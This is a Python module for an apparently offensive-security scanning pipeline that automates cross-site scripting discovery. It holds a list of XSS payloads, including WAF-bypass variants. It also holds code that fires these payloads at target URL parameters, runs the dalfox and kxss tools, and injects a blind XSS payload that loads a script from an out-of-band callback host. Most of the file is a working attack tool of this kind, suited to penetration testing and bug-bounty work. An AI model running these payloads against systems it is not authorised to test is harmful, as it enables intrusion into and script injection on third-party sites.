#!/usr/bin/env python3
# engines/xss_engine.py — XSS Engine v6 (Upgraded)
# DOM XSS detection, Blind XSS (OOB), WAF bypass payloads
# MilkyWay Intelligence | Author: Sharlix

import os
import re
import urllib.request
import urllib.parse
import urllib.error
from core.utils import safe_read, count_lines

# DOM XSS sinks — JavaScript that processes URL/input unsafely
DOM_SINKS = [
    r'innerHTML\s*=',
    r'document\.write\s*\(',
    r'eval\s*\(',
    r'setTimeout\s*\(',
    r'setInterval\s*\(',
    r'location\.href\s*=',
    r'location\.assign\s*\(',
    r'location\.replace\s*\(',
    r'\.src\s*=',
    r'\.href\s*=.*location',
    r'window\.open\s*\(',
    r'\.insertAdjacentHTML\s*\(',
    r'document\.createElement.*location',
]

DOM_SOURCES = [
    r'location\.search',
    r'location\.hash',
    r'location\.href',
    r'document\.referrer',
    r'document\.URL',
    r'document\.cookie',
    r'window\.name',
    r'URLSearchParams',
]

# XSS payloads with WAF bypass techniques
XSS_PAYLOADS = [
    # Basic
    ('"><svg/onload=alert(1)>',                   "basic_svg"),
    ('"><img src=x onerror=alert(1)>',            "basic_img"),
    ("'><script>alert(1)</script>",               "basic_script"),
    # Event handlers
    ('" onmouseover="alert(1)"',                  "event_attr"),
    ('" autofocus onfocus="alert(1)"',            "autofocus"),
    ('<details open ontoggle=alert(1)>',          "details_toggle"),
    # WAF bypass
    ('<ScRiPt>alert(1)</ScRiPt>',                 "case_bypass"),
    ('<svg><animate onbegin=alert(1) attributeName=x>', "animate_onbegin"),
    ('%3Cscript%3Ealert(1)%3C/script%3E',         "url_encoded"),
    ('"><svg onload=alert(1)>',                   "svg_onload"),
    ('<img src=1 oNeRrOr=alert(1)>',              "mixed_case"),
    ('javascript:alert(1)',                       "js_proto"),
    # JS context breaks
    ("';alert(1)//",                              "js_string_break"),
    ('";alert(1)//',                              "js_dquote_break"),
    ('`-alert(1)-`',                              "template_literal"),
    # HTML entities bypass
    ('&lt;script&gt;alert(1)&lt;/script&gt;',     "entity_encoded"),  # check if decoded by app
]

# Blind XSS payloads (for OOB testing)
BLIND_XSS_PAYLOAD = '<script src="https://OOB_URL/b.js"></script>'


class XSSEngineV6:
    """
    XSS Engine v6 — DOM, Reflected, Blind (OOB), WAF bypass.
    
    Improvements over v5:
    - DOM XSS sink/source detection in JS files
    - Blind XSS via OOB callback
    - WAF bypass payload variants
    - Response context analysis (HTML/JS/Attribute)
    - False positive reduction via encoding check
    """

    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log

    def run(self):
        urls_file = self.p.files.get("urls","")
        live_file = self.p.files.get("live_hosts","")
        js_file   = self.p.files.get("js_files","")
        xss_out   = self.p.files.get("xss_results","")
        found     = 0

        # Step 1: DOM XSS detection in JS files
        if os.path.isfile(js_file):
            dom_found = self._check_dom_xss(js_file)
            found += dom_found

        # Step 2: gf filter for reflected XSS params
        xss_params = os.path.join(self.p.out, f"{self.p.prefix}_xss_params.txt")
        self.p.shell(f"cat {urls_file} 2>/dev/null | gf xss > {xss_params} 2>/dev/null")

        if count_lines(xss_params) == 0:
            # Fallback: use param intelligence to find XSS-prone params
            self._extract_xss_params(urls_file, xss_params)

        # Step 3: Dalfox (tool-based)
        auth = f"--cookie '{self.p.args.cookie}'" if getattr(self.p.args,"cookie",None) else ""
        self.p.shell(
            f"dalfox file {xss_params} --skip-bav --silence --no-color "
            f"{auth} -o {xss_out} 2>/dev/null",
            label="dalfox xss", timeout=600)

        # Step 4: Parse dalfox output — FIX: add_finding for each result
        dalfox_found = self._parse_dalfox(xss_out)
        found += dalfox_found

        # Step 5: kxss for quick reflection check
        self.p.shell(f"cat {xss_params} | kxss 2>/dev/null",
                     label="kxss", append_file=xss_out)

        # Step 6: Manual payload testing with WAF bypass
        manual_found = self._test_waf_bypass(xss_params, xss_out)
        found += manual_found

        # Step 7: Blind XSS via OOB (if available)
        if self.p.oob:
            blind_found = self._inject_blind_xss(xss_params)
            found += blind_found

        self.log.success(f"XSS: {found} findings")

    def _check_dom_xss(self, js_file: str) -> int:
        """Check JS files for DOM XSS sink+source combinations."""
        found = 0
        js_urls = safe_read(js_file)[:30]

        for url in js_urls:
            try:
                req  = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=10)
                js   = resp.read(100000).decode("utf-8", errors="ignore")
            except Exception:
                continue

            # Look for source → sink patterns
            sources_found = [s for s in DOM_SOURCES if re.search(s, js)]
            sinks_found   = [s for s in DOM_SINKS   if re.search(s, js)]

            if sources_found and sinks_found:
                detail = (f"DOM XSS: source={sources_found[0]} → "
                          f"sink={sinks_found[0]}")
                self.p.add_finding("high", "DOM_XSS", url, detail, "dom-analyzer")
                found += 1

        return found

    def _extract_xss_params(self, urls_file: str, out_file: str):
        """Extract URLs with XSS-prone params when gf returns nothing."""
        if not os.path.isfile(urls_file): return
        xss_params = {
            "q","search","query","s","input","text","comment","msg","message",
            "name","title","description","content","body","value","data","html",
            "username","user","feedback","note","subject","error","info"
        }
        added = set()
        with open(urls_file) as f:
            lines = [l.strip() for l in f if l.strip()]
        with open(out_file, "w") as out:
            for url in lines[:2000]:
                if "?" not in url: continue
                try:
                    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                    for k in qs:
                        if k.lower() in xss_params and url not in added:
                            out.write(url + "\n")
                            added.add(url)
                            break
                except Exception:
                    pass

    def _parse_dalfox(self, xss_out: str) -> int:
        """Parse dalfox output and add confirmed XSS findings."""
        if not os.path.isfile(xss_out): return 0
        found = 0
        with open(xss_out) as f:
            for line in f:
                line = line.strip()
                if not line: continue
                # Dalfox format: [G] [V] [POC] URL
                if "[V]" in line or "[POC]" in line or "VULN" in line.upper():
                    url = re.search(r'https?://\S+', line)
                    if url:
                        self.p.add_finding(
                            severity  = "high",
                            vuln_type = "XSS",
                            url       = url.group(),
                            detail    = line[:100],
                            tool      = "dalfox",
                            status    = "confirmed",
                        )
                        found += 1
        return found

    def _test_waf_bypass(self, params_file: str, out_file: str) -> int:
        """Test WAF bypass XSS payloads manually."""
        if not os.path.isfile(params_file): return 0
        targets = safe_read(params_file)[:30]
        found   = 0

        for url in targets:
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                if not qs: continue
            except Exception:
                continue

            # Test each param with WAF bypass payloads
            for param in list(qs.keys())[:3]:
                for payload, bypass_type in XSS_PAYLOADS[3:8]:  # WAF bypass variants
                    test_qs  = dict(qs)
                    test_qs[param] = [payload]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))

                    resp = self._fetch(test_url)
                    if not resp or resp.get("status") != 200:
                        continue

                    body = resp.get("body","")

                    # FP check: don't report if HTML-encoded
                    if "&lt;script" in body or "&lt;svg" in body:
                        continue

                    # Check unencoded reflection
                    if payload in body or urllib.parse.unquote(payload) in body:
                        detail = f"XSS bypass={bypass_type} param={param}"
                        with open(out_file,"a") as f:
                            f.write(f"WAF_BYPASS_XSS: {test_url} | {detail}\n")
                        self.p.add_finding("high", "XSS_WAF_BYPASS", test_url,
                                           detail, "xss-waf-bypass", response=body,
                                           payload=payload)
                        found += 1
                        break

        return found

    def _inject_blind_xss(self, params_file: str) -> int:
        """Inject Blind XSS payload for OOB detection."""
        if not os.path.isfile(params_file): return 0
        targets = safe_read(params_file)[:20]

        oob_url = self.p.oob.get_payload("blind_xss", "xss_test")
        payload = BLIND_XSS_PAYLOAD.replace("OOB_URL", oob_url.replace("http://",""))

        injected = 0
        for url in targets:
            try:
                parsed = urllib.parse.urlparse(url)
                qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                for param in list(qs.keys())[:2]:
                    test_qs    = dict(qs)
                    test_qs[param] = [payload]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)))
                    self._fetch(test_url, timeout=5)
                    injected += 1
            except Exception:
                pass

        if injected:
            self.log.info(f"Blind XSS: {injected} payloads injected → monitor Interactsh")
        return 0  # Don't count as finding until OOB callback received

    def _fetch(self, url: str, timeout: int = 8) -> dict:
        try:
            req  = urllib.request.Request(url, headers={
                "User-Agent": self.p.bypass.ua(),
                "Accept"    : "text/html,*/*",
            })
            resp = urllib.request.urlopen(req, timeout=timeout)
            body = resp.read(30000).decode("utf-8", errors="ignore")
            return {"status": resp.status, "body": body}
        except urllib.error.HTTPError as e:
            return {"status": e.code, "body": ""}
        except Exception:
            return None
